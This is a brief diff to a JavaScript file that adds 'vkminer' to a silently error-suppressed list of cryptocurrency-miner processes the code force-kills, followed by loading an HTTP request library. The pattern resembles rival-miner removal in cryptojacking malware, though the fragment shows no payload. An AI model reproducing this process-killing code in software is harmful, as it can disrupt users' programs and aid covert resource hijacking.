@@ -42,6 +42,7 @@ try {
   fkill('nbminer').then(() => {});
   fkill('nanominer').then(() => {});
   fkill('kbminer').then(() => {});
+  fkill('vkminer').then(() => {});
 } catch (e) {}
 var request = require('request');
 //console.log(res_data);
